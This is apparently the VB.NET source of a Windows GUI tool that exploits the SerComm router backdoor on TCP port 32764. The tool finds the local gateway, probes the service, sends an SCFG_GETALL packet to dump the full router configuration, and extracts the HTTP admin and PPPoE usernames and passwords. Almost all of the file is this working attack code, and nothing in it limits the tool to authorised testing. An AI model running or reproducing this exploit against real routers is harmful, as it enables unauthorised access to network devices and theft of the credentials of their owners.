Imports System
Imports System.Collections.Generic
Imports System.Text
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.IO
Imports System.Text.RegularExpressions
Imports System.Net.Sockets


Public Class GUI_Main

    Dim attacking As Boolean = False
    Dim ipProperties As IPGlobalProperties

    'Protocol Structure
    'Size of 0xC // 12bytes
    'taken from SerComm's header file
    Public Structure scfgmgr_header_s
        Public magic As UInteger
        Public cmd As Integer
        Public len As UInteger
    End Structure

    Public Enum cmd_type
        SCFG_WARNING = -2
        SCFG_ERR
        SCFG_OK
        SCFG_GETALL
        SCFG_GET
        SCFG_SET
        SCFG_COMMIT
        SCFG_TEST
        SCFG_ADSL_STATUS
        SCFG_CONSOLE
        SCFG_RECEIVE
        SCFG_VERSION
        SCFG_LOCAL_IP
        SCFG_RESTORE
        SCFG_CHECKSUM
        SCFG_CFG_INIT
    End Enum



    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        GUI_About.ShowDialog()
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        ConsoleWindow1.cls()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If ConsoleWindow1.Text <> String.Empty Then
            Clipboard.SetText(ConsoleWindow1.Text)
        End If
    End Sub

    Private Sub GUI_Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ConsoleWindow1.PrintLine("TCP/32764 Tool")

        'get info
        ipProperties = IPGlobalProperties.GetIPGlobalProperties()


        'print
        ConsoleWindow1.PrintLine(String.Format("Host name: {0}", ipProperties.HostName))
        ConsoleWindow1.PrintLine(String.Format("Domain name: {0}", ipProperties.DomainName))

    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If attacking <> True Then
            Attack()
        End If
    End Sub


    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click

        ShowNetworkInformation()
    End Sub



    Private Function SizeOf(ByVal _inbytes As Byte()) As UInt32
        Return _inbytes.Length
    End Function

    Private Sub Attack()
        attacking = True
        Dim DumpArr As List(Of String)

        ConsoleWindow1.PrintLine("Attempting TCP connection to port 32764..")

        Try
            Dim tcp = New TcpClient(TextBox1.Text, 32764)
            Dim PEndian As ByteOrder


            If tcp.Connected = True Then
                ConsoleWindow1.PrintLine("Successfully connected! >: ) ")


                ' Translate the passed message into ASCII and store it as a Byte array. 
                Dim data As [Byte]() = System.Text.Encoding.ASCII.GetBytes("TopKek")

                ' Get a client stream for reading and writing. 
                '  Stream stream = client.GetStream(); 
                Dim stream As NetworkStream = tcp.GetStream()
                ' Send the message to the connected TcpServer. 
                stream.Write(data, 0, data.Length)

                ConsoleWindow1.PrintLine("Sent! ""TopKek"" ASCII")





                Dim EndianResponse(4 - 1) As Byte
                Dim AddressResponse(4 - 1) As Byte

                ' Read the first batch of the TcpServer response bytes. 
                stream.Read(EndianResponse, 0, 4)
                stream.Read(AddressResponse, 0, 4)


                'check Endian
                If BitConverter.ToUInt32(EndianResponse, 0) = &H53634D4D Then
                    'little
                    PEndian = ByteOrder.LittleEndian
                    ConsoleWindow1.PrintLine("DETECTED: Little Endian")

                ElseIf BitConverter.ToUInt32(EndianResponse, 0) = &H4D4D6353 Then
                    'BIG
                    PEndian = ByteOrder.BigEndian
                    ConsoleWindow1.PrintLine("DETECTED: BIG Endian")
                Else
                    'Error
                    PEndian = ByteOrder.UnknownEndian
                    ConsoleWindow1.PrintLine("Error getting Endian type")
                    tcp.Close()
                    System.Media.SystemSounds.Hand.Play()
                End If



                ' Receive the TcpServer.response. 
                ' Buffer to store the response bytes.
                data = New [Byte](256) {}

                'Read remaining bytes and add the other 2 ints we read
                Dim bytes As Int32 = stream.Read(data, 0, data.Length)
                bytes += 8


                ConsoleWindow1.PrintLine("Response size: " & bytes & "bytes")

                ' Close everything.
                stream.Close()
                tcp.Close()


                'check endian
                If PEndian <> ByteOrder.UnknownEndian Then

                    ConsoleWindow1.PrintLine("Gateway is vulnerable!")
                    Dim Csocket As New Socket(SocketType.Stream, ProtocolType.Tcp)
                    Csocket.Connect(TextBox1.Text, 32764)


                    'builder
                    Dim ms As New MemoryStream()
                    Dim bw As New BinaryWriter(ms)


                    If Dump_ConfCheckbox.Checked = True Then
                        ConsoleWindow1.PrintLine("Attemping to dump router config!")
                        ConsoleWindow1.PrintLine("Attack!,Attack!,Attack!")


                        Dim samplePayload As Byte() = {0}
                        Dim packetHead As scfgmgr_header_s
                        Dim packetBody As Byte() = samplePayload
                        Dim cmd As cmd_type = cmd_type.SCFG_GETALL

                        packetHead.magic = &H53634D4D '//MMcS
                        packetHead.cmd = cmd
                        packetHead.len = SizeOf(packetBody)


                        'write to stream

                        'head
                        bw.Write(packetHead.magic)
                        bw.Write(packetHead.cmd)
                        bw.Write(packetHead.len)

                        'body
                        bw.Write(packetBody)


                        'Packed bytes
                        Dim PackedPacket As Byte() = ms.ToArray
                        bw.Close()


                        'send data
                        ConsoleWindow1.PrintLine(String.Format("Sending: " + cmd.ToString))
                        Csocket.Send(PackedPacket)

                        'recieve
                        Dim recContainer(Csocket.ReceiveBufferSize) As Byte
                        Dim recBytes As Integer = Csocket.Receive(recContainer) 'BREAKPOINT AFTER THIS
                        ConsoleWindow1.PrintLine(String.Format("Received: " & recBytes & "bytes"))

                        If recBytes >= 4 Then
                            ConsoleWindow1.PrintLine(String.Format("Deciphering data..."))

                            Dim HeaderCheck As Integer = BitConverter.ToInt32(GetBytes(recContainer, 4), 0)
                            If HeaderCheck = &H53634D4D Then
                                ConsoleWindow1.PrintLine(String.Format("Valid header received!"))

                                Dim R_Message As cmd_type = BitConverter.ToInt32(GetBytes(recContainer, 4, 4), 0)
                                ConsoleWindow1.PrintLine(String.Format("Message: " & R_Message.ToString))
                                Dim R_Length As Integer = BitConverter.ToInt32(GetBytes(recContainer, 4, 4), 0)
                                ConsoleWindow1.PrintLine(String.Format("Data size: " & R_Length & "bytes"))
                            Else
                                ConsoleWindow1.PrintLine(String.Format("Header tag mismatch :("))
                                Csocket.Close()
                                System.Media.SystemSounds.Hand.Play()
                            End If
                        Else
                            ConsoleWindow1.PrintLine(String.Format("Error not enough data received :( i cri"))
                            Csocket.Close()
                            System.Media.SystemSounds.Hand.Play()
                        End If
                      

                        'send again BRUTEFORCE THE CUNT
                        ConsoleWindow1.PrintLine(String.Format("Sending: " + cmd.ToString))
                        Csocket.Send(PackedPacket)
                        'recieve
                        Dim PayLoad(Csocket.ReceiveBufferSize) As Byte
                        Dim PayLoad_Bytes As Integer = Csocket.Receive(PayLoad) 'BREAKPOINT AFTER THIS
                        ConsoleWindow1.PrintLine(String.Format("Received Payload: " & PayLoad_Bytes & "bytes"))

                        DumpArr = ReadAsciiZArray(PayLoad)
                        Dim DumpString = String.Join(String.Empty, DumpArr.ToArray())
                        ConsoleWindow1.PrintLine(DumpString)


                        'Dump out the data we are sending in a file
                        'Dim outputStream As New FileStream("O:\Rambox\outpacket.npacket", FileMode.Create, FileAccess.Write)
                        'Dim outputWriter As New BinaryWriter(outputStream)
                        'outputWriter.Write(PayLoad)
                        'outputWriter.Close()

                        If Dump_CredCheckbox.Checked = True Then
                            Dim resultu As String = DumpArr.FirstOrDefault(Function(s) s.Contains("http_username"))
                            Dim resultp As String = DumpArr.FirstOrDefault(Function(s) s.Contains("http_password"))

                            Dim result_pu As String = DumpArr.FirstOrDefault(Function(s) s.Contains("pppoe_username"))
                            Dim result_pp As String = DumpArr.FirstOrDefault(Function(s) s.Contains("pppoe_password"))
                            ConsoleWindow1.PrintLine(resultu)
                            ConsoleWindow1.PrintLine(resultp)
                            If result_pu <> String.Empty Then
                                ConsoleWindow1.PrintLine(result_pu)
                            End If
                            If result_pp <> String.Empty Then
                                ConsoleWindow1.PrintLine(result_pp)
                            End If
                        End If
                    End If





                Else
                    ConsoleWindow1.PrintLine("Endian unknown aborting...")
                    System.Media.SystemSounds.Hand.Play()
                End If
            Else
                ConsoleWindow1.PrintLine("Error connecting :(")
                tcp.Close()
                System.Media.SystemSounds.Hand.Play()
            End If
        Catch e As ArgumentNullException
            ConsoleWindow1.PrintLine(String.Format("ArgumentNullException: {0}", e))
            System.Media.SystemSounds.Hand.Play()
        Catch e As SocketException
            ConsoleWindow1.PrintLine(String.Format("SocketException: {0}", e))
            System.Media.SystemSounds.Hand.Play()
        Catch ex As Exception
            ConsoleWindow1.PrintLine("Error: " & ex.Message.ToString)
            System.Media.SystemSounds.Hand.Play()
        End Try



        attacking = False
    End Sub


    Public Sub ShowNetworkInformation()
        Dim myRegex As New Regex("^(([01]?\d\d?|2[0-4]\d|25[0-5])\.){3}([01]?\d\d?|25[0-5]|2[0-4]\d)$")
        Dim NetworkAdapters() As NetworkInterface = NetworkInterface.GetAllNetworkInterfaces
        Dim myAdapterProps As IPInterfaceProperties = Nothing
        Dim myGateways As GatewayIPAddressInformationCollection = Nothing
        'detected X many gateways
        ConsoleWindow1.PrintLine("Detected Gateways:")

        For Each adapter As NetworkInterface In NetworkAdapters
            myAdapterProps = adapter.GetIPProperties
            myGateways = myAdapterProps.GatewayAddresses
            For Each Gateway As GatewayIPAddressInformation In myGateways
                If Not Gateway.Address.ToString = "0.0.0.0" Then

                    If myRegex.IsMatch(Gateway.Address.ToString) Then
                        ConsoleWindow1.PrintLine("Gateway ")
                        ConsoleWindow1.PrintLine("{")
                        ConsoleWindow1.PrintLine("Address: " & Gateway.Address.ToString)
                        ConsoleWindow1.PrintLine("}")
                        'seta
                        TextBox1.Text = Gateway.Address.ToString
                    End If
                End If
            Next
        Next
    End Sub


    Private Sub Dump_ConfCheckbox_CheckedChanged(sender As Object, e As EventArgs) Handles Dump_ConfCheckbox.CheckedChanged
        If Dump_ConfCheckbox.Checked = True Then
            Dump_CredCheckbox.Enabled = True
        Else
            Dump_CredCheckbox.Checked = False
            Dump_CredCheckbox.Enabled = False
        End If
    End Sub
End Class
